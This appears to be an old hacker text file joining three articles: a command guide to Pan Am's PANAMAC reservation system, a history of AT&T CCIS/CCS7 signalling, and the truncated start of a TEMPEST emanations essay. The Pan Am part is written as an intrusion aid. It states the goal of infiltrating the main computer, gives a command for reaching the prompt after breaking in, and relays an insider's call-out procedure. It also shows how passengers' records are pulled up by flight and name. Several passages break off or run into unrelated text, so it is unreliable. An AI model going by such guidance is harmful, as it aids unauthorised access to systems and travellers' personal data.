This is entered when waiting for the passengers check to arrive. On 19APR its
checked for arrival. If arrived then the tickets are mailed. If check is not
received then tickets are not mailed.

If the payment is made by a Credit Card then entry is:

>7 U 19APR * CC

This agent will refer to the fone field where the CC info is stored. Here the
ticket is mailed on the date issued.

Outside U.S travel agencies are given a Ticket Time Limit. The entry is:

>7 Q 5MAY

When showing PNR ticketed with the letter "O". Its not necessary to enter
a date, as the Panamac already enters it that the reservation is being ticketed
Enter:

>7 O [assume that the date today is 5may]

PANAMAC will display:

TKT-O 17APR NYC  000 [SINE OF THE AGENT WHO MADE THE ENTRY]

TKT-O - IS THE TICKET CODE
17APR - TODAYS DATE
MYC - PANAMAC SET LOCATION
000 - SEPARATOR
[  ] - SINE OF THE AGENT

If all passengers are having thier tickets issued at the same time and place,
passenger relating is not necessary. But, if the passengers have different
dates or ticketing arrangements then the entries must be made separately and
Passenger Name Related.

For eg. Assume there are 3 passengers on the PNR. Passenger 1 and 2 will call
for their tickets at the Pan Am office and June 3. Passenger 3 wants his ticket
mailed on June 6 and will pay by personal check. The entries are:

>7 1-2 W 3JUN
>7  3 U 6JUN * CK FOR CHECK

Output:

TKT-1-2 W03JUNNYC000[SINE OF AGENT] 2.3 U0JUNNYC000[SINE OF AGENT] CK FOR CHECK

Here the 1-2 is the first entry related to the passengers 1 & 2 and 2.3 is the
second entry related to passenger 3
NYC - location of P.set

Change/Delete :
---------------
Suppose the display for the ticket field was:

TKT-W08APRLAX000BS

Here the ticket will be issued on the 8th of APR. The Panamac set is located
in LAX(Los Angeles). Also after the sepater (000), the BS is just an example
of a SINE of the agent.

Lets assume today is 7th of APR and the passenger has come to pick it up.
The agent has to instruct the PANAMAC that its TICKETED. Therefore he/she
would enter :

>7 1 (Change Symbol) O

Here:
7 - This is the field of the ticketing
1 - is the entry number
O - New Information

One has to remember that if changing related TKT entry then just enter
Passenger Name number after the Change Symbol. Then the new Inforamtion. It may
look like "7 1 (Change Symb.) 1-2 W 19APR"
To delete an entry just enter Field , Entry # then the Change Symb.

End Trasaction:(ET)
-------------------
The PNR is now complete. After completing it the agent must End Transaction
(ET).This key is located as one of the function keys.

>ET

Output:

A OK 4SW#32G

The 4SW#32G is called the RAD NUMBER or RECORD LOCATER or PNR ADDRESS.
After Ending Trasaction the PANAMAC will send a message to all the airline
in the Itinenary advising them of the flights the agents have booked/requested
and name of passenger.

SHELL PNRS
----------
Some records like travel agencie's accounts, corporate accounts and thier FT
number, Tel #, Address etc. have to be stored
permanently in the PNR. Therefore Panamac has what called SHELL PNRs.
Here file will become a permanent and reusable record.

A shell PNR can be retrieved by the account number, Telephone number and
ARC (Airline Reporting Corporation) or IATA(International Air Transport
Association). The ARC/IATA use last 5 Digits numeric plus check digit
The entry to display a shell PNR before beginning normal PNR creation
begins with the letters "RP" then a "*" then comes the Account Number.
Example:

>RP*7183589901

Ouput would be:

NYC PA A QH 24FEB88 2034
NO NAMES
NO ITIN
FONE-NYC-A 718/358-9901/*ARC 413453
2.NYC-A AMERICAN
TKT-024FEBNYC000BS DKIR
RMARS-*

The Itinenary may now be booked and the PNR completed as usual. Shell PNRs
may also be retrieved using the following entries:

   ARC/ATC # - RP*ATC494340 [use last 5 numbers numeric plus check digit]
   IATA # - RP*ITA945934 [Also use last 5 numeric plus D.C]
   Account Code Number - RP*ACN7734 (In some countries only]

Shell PNRs can be merged with PNRs by just entering a "M" after the RP.

Retreiving a PNR:
-----------------
After the sales agent completes a PNR. It is sent to the Master Computer at
Rockleigh,N.J. To retreive a PNR  , enter "*" and the PNR ADDRESS or by using
the flight,date and boarding off and on points and name of passenger eg:

>* PA 56/10AUG MIANYC - DAVIS

The hyphen is mandatory here.

The Panamac's output will be:

PA56/10AUG MIANYC - DAVIS
01 3DAVIS/TOMMR/CATHYMRS/FIFIMS
02 1DAVIDSON/SHASHI
:
etc
:

To retrieve the entries just choose the line number then enter:

>*2

The "*" has to be there or errors will ocurr. [No comand probably]
Anyway the "*2" will give you the account for Davidson.

To cancel a PNR you retrive just enter the "IXTN" in the fuction keys.

Introduction & clearing up a confusion
--------------------------------------

Welcome to Part B of "The Pan-Am Airline Computers". I hope you have found the
first part intresting.

I would like to take this opportunity in clearing up a minor confusion that
some of you may have while reading the first part of this file.

There are 2 types of systems I talk about in the first part which are:

o  Pan-Am main computer  &
o  The Panamac or PANAMAC

The Pan-Am main computer is used to store and view performance of the entire
network. Pan American has 3 main computer systems to serve the surrounding
states. These are located in Florida, Washington and NewJersey. There may
exsist one in California but we dont have enough proof to be sure.Although they
may have smaller terminals connected to these 3 major terminals and all the
material that is covered here also applies for these smaller terminals.
The Panamac are computers that are used by sales agents to book flights, give
information and the works. Although the Pan-Am main computer can also handle
all the tasks that the PANAMAC can. Here is what the the Pan Am network looks
like:


Example of a simplified Pan Am Network

                                  building. Like the major Pan Am building
                                  in Manhatten in Newyork.

The cartridge area is where they insert physical cartridges for new rates
of travelling, new routes , cancellation of rountes etc. The Panamac uses
all this information supplied by the cartridge area so that the Sales agents
can answer our various questions and book us flights. The cartridge area
contains the main program for the Panamac's to run. All the information from
the cartridge area is passed to the sub terminal then to the main computer
The surrounding states may connect to one or many sub terminals then finally
leading to the main computer. Our main purpose here is to infiltrate the main
computer where all the information is stored and has control over the entire
network that it serves. I have heard from employees that Pan-Am has the latest
on ANI equipment and therefore please proceed with caution.

Another thing is that when you have successfully hacked the system and you dont
get the SOM ">" prompt then type in ">SOMTERM" and hopefully you will
end up with the SOM.

I hope this has cleared the confusion and now lets continue.


                               Part VIII
                               ---------

Host Facts
----------
The Host facts field contains 2 types of entries:

Other Service Information (OSI) entries which give information about passenger
so that they can be offered proper assistance or recognition.

A passengers speaks (SPKS) only a language other than English or Meet and
assist (MAAS) and this passenger is elderly and needs assistance.

Into the OSI goes anything pertinent from age to language, that they should
know in order to talk to the passwngers as an individual.

All the entries in the FAX field begin with digit 4. The code "PA" os used
to send message to Pan Am only, This special information is entered as follows:


>4 OSI PA_MAAS PSGR ELDERLY ASSIT IN TRANSIT

A space is madatory only after PA then free form test is permitted. OSI
information will be transmitted to the airport so that the appropriate action
may be taken. In addition, special 4 chracter codes are to be used if the OSI
details are to be taken transmitted directly to the airport check system.

>4 OSI PA SPKS SPANISH ONLY
>4 OSI PA FRTV PA62634678J-STARK/AMR

If the passenger's description does not match one of the codes listed in the
system enter the information as free form test after the
"PA"

For eg.

>4 OSI OA VIP MAYOR OF N.Y

In addition there is a special format to indicate that a passenger is an infant
(INF) which include the age indicated in months (1yr=12MTS)

For eg.

>4 OSI PA INF DAVIDSON/JR MSTR 5MTHS

Note: If there are two or more infants traveling, seperate OSI entries must
be made for each other

                                Part IX
                                --------

Special Service Requirements (SSR) entries which require prior arrangements
for something special to be provided to the passenger at the airport or on
the plane.

Entries in this category arrange for a specific item. (e.g. special meal)
to be provided on a flight for the passenger, or to advice the Airport the
passenger is traveling with something which may require advance preparation:
e.g a large pet in cargo or a large amount of excess baggage. Since we are
requesting that a specific items be provided (e.g special meal be put
on the flight), the entry is made with an action code. At the same time, the
entry is related to a specific segment(s) in an intinenary and to a particular
passenger name(s) in the PNR. We need to look at an example. Here is a PNR:

1.1 SHAH/BUPENDRA 2.1EZRA/AMR
1 PA 66 P 19APR JFKBOM HS2 2145 0015
RCVD/RLOC-MR SHAH
FONE-NYC-D 212/555/1234/H
TKT-026FEBNYC00020

Mr. Shah wants a vegetarian meal. Here is the entry:

>4 A VGML FS1 S1 N1

Lets break this down:

4 - 4 field
A - Means add SCR
VGML - Vegetarian meal code
FS1 - Action Code (free sell ) + Number requested.
S1 - Related to Segment 1
N1 - Related to Name number 1

Look at this PNR carefully. The entry relates the special meal in this case
vegetarian to the first segment (S1) and to the first passenger, Mr. Shah,
who is name number 1 (N1). When re-displayed, the HA FAX field appears as
follows:

HA FAX-SSRVGML.PAHS01 PA0066P19APRJFKBOM 1SHAH/BUPENDER

Information about Pan Am policy and procedures governing some SSR entries can
be found in KISSR. Here is a display of the index:

SSR STATION INFORMATION
        INDEX
BASSINETS                    B
SPECIAL MEALS                S
WHEELCHAIRS                  W

In the KISSR you will find description and codes for all special meals and
facts about the current meal and wheelchair policy.

Not all SSR items may be freely sold (FS). The R.M describes the procedure
for requesting (needing) special service requirements. For example, request
(NN) on:

    Special meals within 8 hours of departure

or

    Excess baggage over 150 kilos (350 lbs)

Looks at this example:

Mr. C. Tuc in addition to his free allowance has baggage which will weigh
about 175 Kkilos. The entry will be:

>4A XBAG NN 175KGS S1 N2 . RECORDING EQUIPMENT

XBAG - This is the excess baggage code
NN - Action code
175KGS - Weight in Kilos
S1 - Segment number
N2 - Name number 2
. - This separator which is compulsory
RECORDING EUIPMENT - Text


In this case there is also a description of the excess baggage. The description
or text is mandatory for this entry. The period(.) which acts as a separator
preceeds the text. All SSR entries regarding excess baggage must include a text
and may relate to only one passenger

When redisplayed, the HA FAX field now apprears follows:

HA FAX
1.SSRVGMLPAGS01 PA0066P19APRJFKBOM 1 SHAH/RMR
2.SSRKSMLPAHSO1 PA0066P19APRJFKBOM 1 TUC/AMR
3.SSRXBAGPANN0175KG PA0066P19APRJFKBOM 1 TUC/AMR RECORDING EQUIPMENT

SSR Name relating
-----------------
In from of each name is a name item number. You already know that PANAMAC
assigns numbers for each different surname in a PNR. Also, each passenger
has a passenger name number. In the FACTS example so far, the item number and
the passenger name number were the same.


           A                B                   C
1. 1AOKI/LSMRS 2. 1YAMADA/YRMRS 3. I/1YAMADA/GLENMSTR

1,2,3 are Name Item NBR & the A,B,C are passenger name numbers

When you relate an SSR fact, your entry really refered to the name item i.e
N2 refers to all the passengers in name item 2 (in this case only Mrs. Yamada)
If however the entire Yamada family had been travelling together as in the
following example the name item include more than one name:

1.1AOKI/LSMRS 2.3YAMADA/GOMR/YRMRS/LAMISS 5.1/1YAMADA/GLENMSTR
1 PA 82 Y 16 NOV HNLAX HS4 2300 0604
1 PA 81 Y 28 NOV LAXHNL HS4 1300 1702

If you SSR entry showed name relation to name N2, then the request would be for
all the passengers in NAME ITEM 2... Mr/Mrs/Miss Yamada/

To show a special request for only one passenger in a name item, use a slash
(/) after the name number. The slash acts to "separate" an individual
passenger from the name item may which may include multiple passenger.

For example: Mrs Yamada  is name NBR 3. To confirm a baby meal on both flights
the entry would be:

>4A BBML FS1 S1/2 N3/

The N3 indicates the name number only

Change/Delete/Cancel
--------------------

If you are in the process of making an SSR entry and you have ended the
transaction, no action has yet been taken on the request, You can therefore
delete the entry. For example

>4 3 [change symbol]

You on the other hand while at home can user "*" which works the same way.
The 4 is the field, the 3 is the Fact ITEM number .

You cannot modify an SSR entry to correct it. If your entry is incorrect, you
must delete the entry and reenter the correct SSR fact itme.

In all instance, whether working on a new or retrieved PNR, cancellation of
an itinenary segement will automatically cancel the related SSR item.

For e.g. you have booked:

1.1BROWN/HARRYMR 2.1TOBAR/EMILEMR
1 PA 100 Y 13NOV JFKLHR HS2 1000 2140

Before ending transaction you notice you accidentally confirmed the wrong date.
After cancellation of the incorrect segment, the HA FAX SSR item will look
like this:

HA FAX
1.SSRKSMLPA(XX)02 PA0100Y13NOVJFKLHR 1BROWN/HARRYMR 1 TOBAR/EMILEMR

Cancelled SSR entries will automatically be removed from the PNR when you
End Trasaction. Now you would rebook the correct flight and the Kosher meals.


                               Part X
                               ------


Other Airlines...General Facts
------------------------------

The GFAX or the General Facts, 3 filed contains the same (2) types of entries
as the Host Fax...OSI and SSR..Entries in the GFAX are included to outgoing
messages to other airlines upon ending trasaction. When an itinerary includes
space on another airlines, you must use the GFAX field to notify the other
airline about the special requirements or service information.

All entries in GFAX befin with the digit 3. To send "OSI" information to one
(1) other airlines, use the applicable carrier code. For instance, if the
passenger is an infant travelling on PA and AF, you notify Air France that you
booked an infant by sending an OSI message. The entry is:

>3 OSI AF INF JONES/MARK MSTR 5 MTS

This is in addition to an OSI entry in the 4 field to notify Pan Am at the
airport, Thus 2 entries with the same information are required.

>4 OSI PA INF JONES/MARK MSTR 5 MTS

If a passenger's itinenary include more than one other airline, use the letters
"YY" as the carrier code and make only one GFAX entry. A "YY" will send the
information to all the airlines in the itinerary.

>3 OS1 YY INF JONES/MARK MSTR 9 MTS

Change/Delete
-------------
The input to delete an OSI in the GFAX filed is the same as in HFAX.

>3 1 (change symbol)

To change an OSI entry in the GFAX field the format is the same. You delete,
then reenter the correct information.

>3 OSI AF.... (NEW INFO)

GFAX SSR Entries:
-----------------
SSR entries for other airlines are very similar to Pan Am HA FAX entries. The
entry begins with "3A", followed by the segment and name related request.

For e.g

>3A KSML NH1 S1 N1

Breakdown

3A - This is the GFAX special service request
KSML - Meal code
NH1 - Action code to request
S1 - Segment number
N1 - Name item number.

Any SSR entry to another airline is always on a request basis (NH)

The request message is forwarded to the applicable airline(s) and must await
a reply. Meanwhile, the passenger is adivised the Pan Am has requested the
special service from the other airline(s) involved.

Assume that you have made the following reservations:

1.1WILSON/ERMR
1 PA  218 Y 26FEB CCSJFK HS1 X 0940 1420
2 DL 1425 Y 26FEB JFKSLC HS1   1805 2040

The passengers desires a vegetarian meal and will be taking his dog (weight
30 lbs) with him. To book the SSRs on Pan Am the entries are:

>4A VGML FS1 S1 N1
>4A AVHI FS1 S1 N1 . DOG 30 LBS (AVIH = live animals in hold)

To book the SSRs on Delta Airlines the entries are:

>3A VGML NN1 S2 N1
>3A AVIH NN1 S2 N1 . DOG 30 LBS

Change/Delete
-------------
To cancel or delete items in the GFAX handle exactly as in HFAX.

Before end Transaction: >3 1 (change symbol)
On a retrieved PNR: >3 . 1 XX

Encode/Decode ARIMP Abbreviations
---------------------------------
"ARIMP" codes are abbreviated messages which are used to communicate within
the airline industry. These are listed in Panamac's "KI" information systems
and may be accessed using the following entries:

To find the code for a message (ENCODE), enter:

>KI COD _ (using first letter of subject)

To DECODE an abbreviated message, enter:

>KI DCO _ (using first letter of subject)

                                Part XI
                                -------
Advance Seat Assignments
------------------------
It is Pan Am's policy to assign seats prior to departure only when requested
by passengers. As you know many of us may want specific seat numbers or certain
area for e.g  smoking,non-smoking,window seats,aisle.Seats have to be requested
when the booking is in progress.

Lets take an example. Lets say you have booked a seat for Mr. Davdison on
he has requested seat 3A which is in the non-smoking area and in the first
class (P) cabin. His entries looks like:

1.1DAVIDSON/PLDR
1 PA 30 P  19APR JFKLHR HS1 X 1200 1800
2 PA 40 P  20APR LHRNBO HS1   100  700

To book his request a Host Facts entry is made. For e.g:

>4A NSST NN1 S1 N1 . SEAT 3A

4A - Explained before
NSST - is code for Non Smoking Seat
NN1 - is the action code
S1 - Segment 1
N1 - Name 1
. - Separtor which is compulsory
3A - This is the requested seat

If this seat is available then you will get a "*". A display of the PNR will
show the following:

1.1DAVIDSON/PLDR
1 PA 30 P 19APR JFKLHR HS1 X 1200 1800
2 PA 40 P 20APR LHRNBO HS1   100 700
HA FAX-SSRNNSTPANN01 PA0040P19APR JFKLHR 1DAVIDSON/PLDR SEAT 3A

If the seat is already taken then the output will be:

RE-CHECK AVAILABILITY/REJECTED DATA FOLLOWS/4SSRNSSPANN01 PA0030
P19APRJUNJFKLHR 1DAVIDSON/PLDR SEAT 3A

To print an availability display (seats available) seat map must be displayed.
Enter:

>AC /S2 *

AC - is the availability cabin
S2 - This is the segment 2
* - Display

You will get something like this:

-PA0040P019APR JGKLHR 747-121 ZONE MAR AVAILABLE 9

This past will teach you all about hotels. I dont plan to go into details on
this but will just make you familiar.

There are 4 catagories of hotels:

1. Intercontinental (IHC) the Grand Metropolitan Hotel chain
      (XM Inventory stored in the system
2. Sheraton
      (XM Inventory stored in the system)
3. Other hotels (Special Arrangement)
      (XP Availability )
4. Unlisted Hotels

The XH and XM hotels have the actual inventory of thier rooms stored in
the system and together with XP hotels the three types give you immediate
availability. The hotels with whom Pan Am has a booking agreement are listed in
a City's Station Information. To display the hotel for a city the input is:

>KIBKKH

BKK is the 3 letter city code and H stands for Hotels. The response to this
would be something like:

BKK STATION INFORMATION
HOTEL INDEX
1000 KENYAN CONTINENTAL
1023 SHER BANKOK HOTEL
2351 * TAMARIN *
2342 ASIA
:
etc


The hotels are further identified in the hotel Index by a four digit number,
their name and location if other that the headline City it will be displayed
as "* TAMARIN *"

To determine of the hotel is "XH", "XM" or "XP" and to display details about a
hotel the input is:

Personell who can access the Pan Am main computer may also be able to call
out. I am not positively sure about this because this info was recently given
to me by a Pan Am employee. Enter as follows:

>HOLD NETCHANNEL 1

There may be many netchannels in the systems. If it is occupied then it will
give a "CHANNEL 1 BUSY" error.

Then it will prompt you for a call out password. This is different from your
login password.

Password : XXXXXXXXXX

Then the immediatly after that it will give a prompt "#" . This is where you
will be able to input digits to call out.

Airline Codes
-------------

Pan Am, and all other airlines, use a two-letter airline identification code
for reservation and ticketing purposes. There is no hard and fast rule as to
how the two-letter code is derived. These codes are assigned by IATA/ARC.
This list contains some of the worlds major airlines.

Hope this list will come in handy.

Conclusion
----------

Hope all have found this article of some intrest. My apologies for the lenght.
I have tried my best to include all major topics that may be usefull to the
hacker. I suppose now you know that booking flights is not that easy process.
So next time please dont start yelling at the poor sales agent for some minor
problem.

Using this system can be a lot of fun. Although one can create a major havoc
after infiltration. I urge you all not to do any of that sort. This system is
quite delicate and one should be very carefull when using it. All the reverse
command processes have been included in this article. I have purposely left out
some commands that proved to be harmfull to the system.

Under no circumstances am I responsible for this article's contents, for this
serves only as an educational tool.

I would like to thank Mr. C of the Pan Am Security Division for all his help.

If anyone wishes to get in touch with me, I can be contacted at the Hacker's
Den or at the Phoenix Project.

Best of luck!

This article will inform you of the stages CCS has gone through over the past
years.
CSC known originally as Common Channel Interoffice Signalling was introduced
back in 1976. Since its introduction it has added datagram direct signalling
and has been modernized  by new digital and proccesor technology
and by delvelopments in software enginerring techniques.
This prevents Blue Boxing due to the fact that signals are carried over a
different link than voice.
CCIS net improved its the old trunk signalling bettween SPC (Stored Control
Program) toll switches thereby increasing speed and its economical.
The CCIS network was composed of what know as STPs(Singal Trasfer Points)

The Datalinks use 2.4 kb/s(kilobytes per second).In 1979 they used 1A switch
was added.

Later in 80 they added a special feature of direct signalling (datagram)
which operate at 4.8 kb/s. This capability provided the SPC machines with
the neccesary information through the CCIS Net.The allowed NCP (Network Control
Points). The NCPs connect directly to CCIS at certain STPs.
The SPC machines quired the NCPs and receives the instructions for the action
in response.Therefore they became known as ACPs(Action Control Points).
This status if the CCIS provided 800 services and calling cards.

In 1985 the siganlling network added 2STPs and 56kb/s.This new network was
called CCS7. This new method of signalling used CCITT No.7 Protocol and with
it new more efficient feature came like ISDN.

                          Archaic CCIS in 76'
                          DDDDDDDDDDDDDDDDDD
Before the introduction of CCIS, SF/MF signalling method was in use.
The SF was responsible in determining the idle/busy side state of a trunk.
2600 Hz the idle trunk was removed when a call was to be placed on the trunk.
Then MF signaling was used to determine  routing information to the distant
end and when the party answered the SF was removed from there side.

Tandem switching was not economical and was slow.

As the introduction of SPC came about in which common control equipment was
based on electronic procedures, the overhead associated with the call setup
became a more dominant factor. MF/SF signaling was used until a toll switch
ESS4 was introduced in 76'. Therefore AT&T produced CCIS in assocation with
the ESS4 toll switch. Signalling used a different link than voice.
As mentioned above CCIS used 2.4/kb signalling links to transmit the signal.
Due to the fact that one 2.4/kb could could provide for more than 2000 trunks,
therfore the a regional STP was put in place.
Each STP was connected to several toll switches.Each regional STP was connected
to each of the distant STPs.Each STP was connected to its parner which provided
a path for connections between switches if there was a failure of distant STPs
The STPs in the network were provided by a portion of the processor associated
with the 4A-ETS(Electronic Translator Systems). Message routine within the
STPs was performed by a band and lable scheme that defined a virtual signalling
circuit where 512 bands of 16 trunks coule be accomodated. This allows 8192
voice trunks to be uniquely identified on a specific signaling link.

                     Direct Dialing Signalling(1980)
                     DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
In 1980, a direct signalling capability was added to the CCIS Network. This
capability allwed messages to be sent from a signalling point to any other
signalling point in the network and supported a new network architechture in
which a portion if the switched network routing instruction could be placed an
a database shared by multiple SPC switches.
These common databases became known as network control points (NCPs). The SPC
switches became known as action points (ACPs). because they performed actions
based on instructions from NCPs. This required an inquiry-response in the
Common Channel Interoffice Network.

This communication between ACPs and NCPs was performed by a new feature called
Datagram Direct Signalling. Unlike banded(trunk) signalling. This method of
signalling directed messages on a destination-routing basis through all the
Singal Tranfer Points. Therefore the direct signalling messages included a
unique destination address that was used by the STPs to route the message based
on a table that associated destination addresses with physical points in the
network. With this, the CCIS network could direct messages to individual
functions allowing the introduction of unique services such as advanced 800
with features like time of day routing call prompter and customer-controlled
routing of traffic based on information stored at central databases.

                         CCIS Network Growth
                         DDDDDDDDDDDDDDDDDDD
As the AT&T network grew both in terms of SPC swicthes and volume of traffic,
it became necessary to augment the initial CCIS network capability. First the
number of STP pairs was increased from the initial 10 pairs to 16 pairs.
Three of the additional -airs were used as area STPs, which served the trunking
needs of the portion of the network. The remaining 3 STP pairs were associated
directly with NCP pairs and performed a direct signal funtion. In addition
the message handling capacity of the network was increased by deploying 4-8kb/s
signalling links in place of the original 2.4kb/s links.STP processing capacity
was also increased as the original shared use of the ETS processor was removed
when the switch function at each STP location was transfered to a new 4 Elect-
ronics Switching System machines.

               The Impact of AT&T Divestiture on CCIS Network
               DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
On January 1, 1984 the court-ordered AT&T divestiture became effective.
Divestiture establishment local access and transport areas (LATAs), which
defined local markets areas. AT&T became an inter-LATA carrier providing
communication services between these LATAs. Under the divestiture agreements,
the STPs,NCPs,and interconnecting data links were assigned to AT&T. The minor
use of these facilities by the divestiture BOCs(Bell Operating Companies) was
provided under contract.Equal access to the inter-LATA carriers under
divestiture was provided mostly by MF/SF signalling. However a new multi-stage
MF outpulsing arrangement was added to forward the orginating number to inter-
LATA carrier for billing and other purposes.

                     Common Channel Signalling 7 (1985)
                     DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
During 1985, the STP capability was enhanced by the introduction of 2STP based
on the AT&T 3B20 duplex (3B20D) processor and an associated processor inter-
connect capability (PIC).In addition , 56-kb/s digital facilities were provided
between the STPs. The 2STP uses the CCITT Signalling System 7 protocol and
provides message transfer part (MTP) function. The MTP can route a message
reliably and qucikly from one point in the signalling network to any other
point. The resulting network has been named the CCS7 network. Initially, the
CCS7 network was used to augment the trunk signalling capabilities of the 1STP
network using the embedded CCIS6 (ECIS6) protocol. ECIS6 interacts with CCS7
and allows switching systems connected to the 1STP network to communicate with
other switches connected to the 2STP network.However during this transitional
period, all switching systems are connected to either the 1STP or 2STP
locations via 2.4 or 4.8 kb/s signalling links.

                       CCS7 Destination CCIS (1986)
                       DDDDDDDDDDDDDDDDDDDDDDDDDDDD
In 1986 the CCS7 network was expanded to include direct signalling. This was
done by adding new capabilities in the NCPs to allow 56-kb/s connecting links
and the ability to route direct-signalling messages within the 2STPs. For
transitional compatibility, a new destination CCIS6 (DCIS6) interworking
protocol was deployed. The 4ESS and 5ESS switches in the network will use the
Integrated Services Digital Network User Part (ISDN-UP) to control call setip
and will have the capability to support ISDN services. The ISDN-UP will use the
services of the already deployed MTP and provide a broad set of switched
digital services.

           Evolution of NCP Serices to a Distibuted Architecture
           DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
The increasingly demanding requirements of call processing services such as the
AT&T card service, advanced 800 and software defined network (ISDN) have led to
a steady evolution of the NCP architecture toward more distribution. This is to
increase versatility of the usage, flexibity of growth and performance. At the
same time we will be able to introduce more new services. The orgianl NCPs
introduced in 1980 consisted of AT&T 3B20 duplex processors and multiple disk
drives. The 3B20D handled all the fucntions including query processing database
admnistration and updates and signaling. The first step toward a distriuted
NCP architecture was in the signalling architecture. In 1985 the NCP
incorporated a highly reliable processor interconnect capability(PIC) with the
same technology used in the 2STPs. It provides communication between the CCS
network and the NCP application databases in the 3B20D host Signalling links
from the STPs to an NCP terminate through link nodes(LNs) on the PIC.The CCS
query messages could access an NCP through the LNs and travel to the
appropriate database application in the 3B20D. Similarly query responses
destined to the CCS network could exit from the NCP through the PIC and the LNs
The future NCP architecture will continue to serve host to the NCP distributed
enviroment and the PIC will remain the vehical for the interprocess
communication and signaling-link termination. To attain distributed query
processing, the NCP database architecture will feature the intergration of
multiple transaction-processing components.

                        CCS7 Network Interconnection
                        DDDDDDDDDDDDDDDDDDDDDDDDDDDD
With the potential for end to end signalling services and the adoption of CCS7
standards, there is a growing effort to connect networks of different carriers
and different countries as well as various privately owned networks. It is
expected that in the future all North American networks will have CCS7.
Therefore AT&T is  currently involved in defining standard CCS7 interface for
use between netwroks. Initially, the new interface will consist of 2STPs
deployed in pairs.This network configuration assumes that interconnecting will
use designated STPs as gateways. The gateway STPs will be required to screen
all incoming message to prevent unauthorized use of network resources and
services :-)

Interconnecting networks using designated STPs as gateways.

The same arrangement that is being used domestically is currenlty being inves-
tigated for application to the CCITT No. 7 message transfer part/telephone
user part (MTP/TUP) international network interconnection. However because of
differences between national networks, international interconnection is more
complex. With the implementation of ISDN-UP for international signalling in
early 1990s, it is expected that many of the existing domestic services will
be extended to embrace the international networks as well.

                     CCS7 Support for ISDN Services
                     DDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Common Channel Signalling was designed for signalling between network entities.
ISDN protocols are designed for out of band signalling all the way to the end
user.Much of the current effort in ISDN is in defining protocols and
architectures for providing the out of band signalling from the end user
premises to the network.However to provide end to end service the network has
to transport the end user's out of band signalling, using CCS or other means.
An important benifit of CCS7 is its inherent ability to support feature
transperancy i.e., allowing of passing of information that can only be
interpreted and used by end users.This capability can be attained by
interworking the ISDN Q.931 protocol with the CCS7 ISDN-UP and extending ISDN
to switched access users through network interconnection.
Methods of supporting CCS7 features transparency include:

o Message-associated user to user information
o Temporary and permanent signalling connections.Message associated user to
  user information could pass along with regualar CCS7 call control messages
  as opposed to using signaling connections specifically established for that
  purpose. The transfer of transparent inoformation would generally be done
  after the signalling connection (temporary or permanant) is established but
  message associted transparent information could be transfered during the
  establishment and/or termination phases of the signaling connection.

Both AT&T and the regional BOCs are deploying ISDN signalling in their networks
Once in place, ISDN offers capabilities such as

o Per-cali selsction of services and bandwidth
o Combined voice,data and even video on a single call
o Calling-number identification at the terminating end (for example, a digital
  display for the calling number during ringing)
o Sophisticated multimedia teleconferencing capabilities

Futhermore ISDN will be able to make it possible to add new features and
improve the implementation of the exsisting services such as support packet
transmission and separation of the call/control from user control information
in ISDN.

                   Potential CCS7 Network Enhancements
                   DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
The future CCS network will probably be configured as follows:

1) The ISDN-UP will be used throughout North America.As local carriers adopt
   CCS7 network interconnect will provide for end to end digital services. The
   signalling connection control part (SCCP) will be used to provide data
   capability for ISDN user to user information.
2) The CCITT No. 7 protocol will be used internationally.First the telephone
   user part (TUP) will provide basic call setup to countries that chose to use
   this protocol initially. However because of its increased flexibility and
   support for digital services, the ISDN-UP will be used to extend domestic
   ISDN services worldwide.
3) The interconnection with local exchnage carriers as they expand their own
   CCS systems will enhance LATA access services and allow new inter-LATA
   service.
4) AT&T services will evolve as the flexibility and capacity of the CCS7 of the
   protocol is utilized.The transaction capability and part (TCAP) will provide
   an effecient protocol for direct-signalling query and responses, to support
   new databases and switch-based services.
   The interworking of CCS7 with the Q.931 ISDN access protocol will allow end
   to end services that are not possible with in-band signalling and will
   provide more effective and innovative use of work.

                                  Conclusion
                                  DDDDDDDDDD
The evolution os the AT&T common channel signalling system has been shown to be
a critical part of the AT&T network and services. It has provided a cost
effective means of providing flexibility in the marketplace. The system
is expected to evolve as new capabilities and need are indentified.

                             WHO'S LISTENING
                             ---------------
                              By  Capt. Zap


Over the years, there has been a number of different studies and
discoveries that would alter personal and electronic security over
time. Devices able to "listen" to almost any form of communications
have become commonplace and are available "over the counter" from a
varied number of sources. Such units range from ten to fifteen dollars
to expensive set-ups that employ microwaves and lasers for the
interception of almost any audio signal in the spectrum. But now with
somewhat needed protection from outsiders in reference to this
problem, a number of solutions have been put in place and global
protection is insured in environments that have such need. But the
coverage of environment has had a a major change in protective attention
now being place on the actual electronic emmanations that are so common
with todays standard electronic apparatus. Electronic telephones,
computers and communications networks, ATM's, radio and television
stations are just part of the overall electronic bubble that we have
placed our society into with the hopes of providing better and faster
methods to make daily life a bit easier. But with such a fragile structure
as the electronic bubble, we have new opportunities to discover secrets
never before possible due to the lack of technology. The same technology
that helps us in one way or another may also be helping others
unbeknownist to those who are protecting the environment in the first
place. Signal leakage, either by design or by accident may lead to total
collapse of protective measures due to "wide open spaces" in the
protective sphere. In this particular paper, we will discuss the possible
problems of common office technology may bring in un-securing your
installation.

 Our main focus will be in the areas concerning with the emmanations
or transmissions of "Tempest" frequencies. "Tempest", is the code name
given to a specfic area concerned with radio frequencies radiated by
computing equipment by the U.S. Dept. of Defense. This "concern" from
such equipment dates back to the late 50's. The concern ranged from the
possible interception of "informational information" by sources other
than the intended users of such. The problem is more easily reconigized
by the current requirement of normal electronic equipment having to
conform to emmision standards put forth by the Federal Communications
Commission in reference to the amount of electronic "noise" generated
by common standard technology so that such signals do not interfer
with other such pieces of equipment or their operations.

To describe in simple terms, Tempest frequencies are almost straight
through from commerical AM stations to the upper reaches of 600 Mhz.
They are generated or transmitted by any number of different common
daily life electrical and electronic systems. Your TV puts out one
frequency, the stereo another, the common electronic telephone,
cordless phones still another, the microwave oven puts out another and
the wireless alarm does it to, and story goes on. So just as all of these
pieces of equipment emmit a signal, so does the personal computer.



We will describe two possible examples of such informational information
and the abilty for some with directed intent to cause potentially fatal
results due to the use of directed "noise". It should be noted that
the current specifications for "Tempest" approved systems is considered
classified by the DOD and these specs were not available to the author.
But if one was to look at the specs for normal computing equipment
and reduce the allowed emmission output by at least 50 percent, that
